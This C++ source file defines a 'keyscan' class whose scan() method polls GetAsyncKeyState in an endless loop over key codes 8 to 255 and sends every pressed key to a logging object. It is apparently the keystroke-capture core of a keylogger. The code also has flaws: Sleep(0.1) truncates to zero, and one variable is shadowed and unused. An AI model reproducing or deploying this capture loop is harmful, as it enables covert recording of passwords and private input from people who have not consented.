#include "pch.h"
#include "keyscan.h"

keyscan::keyscan(logging* logger) {
	m_logger = logger;
}

//Keyboard scanner
void keyscan::scan() {
	char KEY = 'x';
	while (true) {
		Sleep(0.1);
		for (int KEY = 8; KEY <= 255; KEY++) {
			if (GetAsyncKeyState(KEY) == -32767) {
				uint8_t code = getcode(KEY);
				if (code != 0x00) m_logger->log(code);
			}
		}
	}
}
